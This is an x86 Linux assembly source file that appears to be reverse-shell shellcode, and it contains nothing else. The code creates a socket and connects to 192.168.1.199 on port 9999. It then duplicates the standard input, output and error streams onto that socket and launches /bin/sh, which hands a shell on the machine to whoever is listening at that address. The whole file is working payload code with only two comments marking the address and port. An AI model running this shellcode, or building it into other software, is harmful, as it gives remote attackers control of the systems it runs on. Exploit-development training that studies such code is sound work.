global _start

section .text
_start:
        push 0x66
        pop eax
        push 0x1
        pop ebx
        xor edx, edx
        push edx
        push ebx
        push 0x2
        mov ecx, esp
        int 0x80
        xchg edx, eax
        mov al, 0x66
        push 0xc701a8c0         ; 192.168.1.199 (put in reverse order)
        push word 0x0f27        ; 9999 (put in reverse order)
        inc ebx
        push word bx
        mov ecx, esp
        push 0x10
        push ecx
        push edx
        mov ecx, esp
        inc ebx
        int 0x80
        push 0x2
        pop ecx
        xchg ebx, edx
loop:
        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop
        mov al, 0x0b
        inc ecx
        mov edx, ecx
        push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        int 0x80
